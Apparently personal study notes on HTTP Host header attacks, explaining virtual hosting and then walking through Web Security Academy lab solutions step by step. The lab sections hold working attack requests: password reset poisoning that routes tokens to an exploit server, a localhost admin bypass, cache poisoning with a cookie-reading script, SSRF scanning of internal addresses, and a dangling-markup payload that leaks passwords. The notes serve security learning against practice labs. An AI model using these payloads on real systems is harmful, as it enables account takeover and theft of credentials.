# 👾 HTTP Host header attacks

## 🔹 What is the HTTP Host header?
- When you type a website like https://example.com into your browser, your browser sends a request to the server.   - But here’s the thing:
     - Many websites share the same IP address (like apartments in a single building).
     - The Host header in HTTP is basically the part of the request that says “Hey server, I want the website example.com, not the other sites living on the same IP.”
     - 👉 Example:
     ```bash 
     GET /index.html HTTP/1.1
     Host: example.com
    ```
    - This tells the server, “Please give me the homepage of example.com.”

## 🔹 What is the purpose of the HTTP Host header?
- Its main purpose is virtual hosting.
- Since multiple websites can run on one server (same IP), the Host header makes sure the server knows which website you actually want.
- Without it, the server would be confused about which site’s content to send you.
- 👉 Think of it like telling a receptionist in a big office building “I’m here to see the Marketing Department (Host: example.com)” instead of just walking in blindly.

## 🔹 How does the Host header solve this problem?
- Imagine one IP = one big apartment building.
- Each flat = one website.
- When you arrive, you must tell the guard which flat (website) you’re visiting.
- That’s exactly what the Host header does — it guides the server to the right “flat” (site) inside a shared “building” (IP).

## 🔹 What is an HTTP Host header attack?
- Here’s where things get interesting 😈.
- If the application trusts the Host header too much, an attacker can tamper with it to trick the website into doing dangerous things.
- 👉 Example attack:
    ```
    GET /reset-password HTTP/1.1
    Host: attacker.com
    ```
- If the site uses the Host header to build password reset links, the victim might receive a link like: http://attacker.com/reset?token=12345
- 😱 Now the victim thinks it’s safe, but the attacker gets the reset link on their domain!

## 🔹 How do Host header vulnerabilities arise?
- They happen when developers don’t validate the Host header properly and just trust it blindly.
- Some risky places:
    - Password reset links (in emails)
    - Absolute URLs in redirects
    - Caching mechanisms
    - Security filters / firewalls
- If the Host header is manipulated, it can:
    - Point users to malicious sites
    - Poison caches (cache poisoning)
    - Bypass security checks
##  🔹 Exploiting Host header vulnerabilities
- Attackers can use this in different ways:
  1. Password reset poisoning – Hijacking reset links sent to users.
  2. Web cache poisoning – Serving malicious content to many users by tricking the cache.
  3. SSRF (Server-Side Request Forgery) – Forcing the server to make requests to internal systems.
  4. Bypassing access controls – If the app checks “Host” to allow/deny requests, attackers can fake it.

### ✅ In Simple words:

Host header = the “address label” telling the server which website you want.
Purpose = makes shared hosting possible.
Problem solved = without it, servers wouldn’t know which site to show.
Attack = bad guys forge this label to trick the website.
Vulnerability cause = developers trusting user input (Host header) without checking.
Exploitation = password reset hijack, cache poisoning, SSRF, phishing-style tricks.


# 📜 LABS

## Lab: Basic password reset poisoning

- Basic Password Reset Poisoning – Short Solution:
- Forgot Password (your account) → get email → reset password.
- In Burp, find POST /forgot-password, send to Repeater.
- Change Host to random → see email with random host → works.
- In Repeater, set:
    ```bash
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    username=carlos
    ```
    → Send.
- Exploit server → Access log → copy Carlos’s temp-forgot-password-token.
- Open your original reset URL → replace token with Carlos’s → set new password.
- Login as carlos → Lab Solved.


## Lab: Host header authentication bypass
- Send GET / to Repeater, change Host to anything → still 200 OK.
- Visit /robots.txt → find /admin. | use **dirb/feroxbuster** to find admin page
- Request /admin → access denied (local only).
- In Repeater, set Host: localhost → access admin panel.
- Change request to:
```
GET /admin/delete?username=carlos
Host: localhost
```
- → Send → Lab Solved.

## Lab: Web cache poisoning via ambiguous requests
- Send GET / to Repeater, add cache buster /?cb=123.
- Add second Host header → reflected in /resources/js/tracking.js.
- Create /resources/js/tracking.js on exploit server with:
    ```js
    alert(document.cookie)
    ```
- In Repeater, send:
    ```http
    GET / HTTP/1.1
    Host: LAB-ID.web-security-academy.net
    Host: EXPLOIT-SERVER-ID.exploit-server.net
    ```
- Repeat until cached with your payload.
- Open cached page in browser 
  → alert() fires → Lab Solved.

## Lab: Routing-based SSRF
- Send GET / to Repeater, replace Host with Collaborator payload → send → confirm DNS hit in Collaborator.
- Send GET / to Intruder, set:
    ```http
    Host: 192.168.0.§0§
    ```
- Payload: Numbers 0–255, uncheck Update Host header to match target → start attack.
- Find 302 redirect to /admin, send to Repeater, request /admin → get admin panel.
- Copy CSRF token + session cookie from /admin.
- Craft:
    ```http
    POST /admin/delete?csrf=<TOKEN>&username=carlos
    Cookie: <session-cookie>
    ```
- → send → Lab Solved.

## Lab: SSRF via flawed request parsing

- Send the successful GET / request to Burp Repeater.
- Observe: Modifying Host directly blocks the request.
- Change request line to absolute URL:
    ```http
     GET https://YOUR-LAB-ID.web-security-academy.net/
    ```
- Modifying Host now causes a timeout (validating URL, not Host).
- Insert Burp Collaborator payload into the Host header and send.
- Confirm server-side request via Collaborator.
- Send this absolute URL request to Burp Intruder, uncheck Update Host header to match target.
- Use Intruder to brute-force Host: 192.168.0.x over /24 range to find the admin interface.
- Once found, send to Repeater and access:
    ```http
    - GET https://YOUR-LAB-ID.web-security-academy.net/admin- 
    ```
- Extract CSRF token and session cookie from /admin page.
- Modify request to:
    ```http
     GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=<TOKEN>&username=carlos
    ```
- Add session cookie to request, convert to POST, and send.
- Carlos deleted → Lab solved.

## Lab: Host validation bypass via connection state attack
- Send GET / to Burp Repeater.
- Change path to /admin, Host to 192.168.0.1, and send → redirects to homepage.
- Duplicate tab, group both tabs.
- In Tab 1:
    - Set path to /.
    - Set Host to YOUR-LAB-ID.h1-web-security-academy.net.
    - Set Connection to keep-alive.
    - Change Send mode to Send group in sequence (single connection).
    - Send sequence → Second request gets admin panel.
    - Note /admin/delete, username, csrf from response.
- In Tab 2, create:
    ``` http
    POST /admin/delete HTTP/1.1
    Host: 192.168.0.1
    Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 53
    csrf=YOUR-CSRF-TOKEN&username=carlos

    ```
- Send both tabs again in sequence → Lab solved.
- if lab is not sloved then try to change request body method . then try (GET->Post -> GET->POSt)

## Lab: Password Reset Poisoning via Dangling Markup
1. **Trigger Password Reset (Own Account)**
   - Go to login page and request a password reset for your own account.
   - Open the **Exploit Server Email Client** → observe password appears directly in **email body**, not URL.

2. **Identify Vulnerability**
   - View **raw HTML** of the email → content is unsanitized.
   - Send `POST /forgot-password` to **Burp Repeater**.
   - Modify `Host` header to include an arbitrary port:
     ```
     Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
     ```
   - Trigger new email → **port is reflected** in raw HTML.

3. **Exploit Using Dangling Markup**
   - Resend the password reset request with:
     ```
     Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
     ```
   - Check **raw email** → content truncated.
   - Go to **Exploit Server Access Log** → see full leaked password.

4. **Attack Target User**
   - Modify request to:
     ```
     username=carlos
     ```
   - Refresh **access log** → retrieve Carlos's password.
   - **Login as carlos** → Lab solved.

---

## Key Takeaways
- Unsanitized raw email views can expose sensitive data.
- DOMPurify only protects rendered content, not raw HTML views.
- Dangling markup (`'<a href=...`) can exfiltrate subsequent content.
- Always validate and sanitize **all outputs**, not just rendered ones.

#### *ROBIN H00D*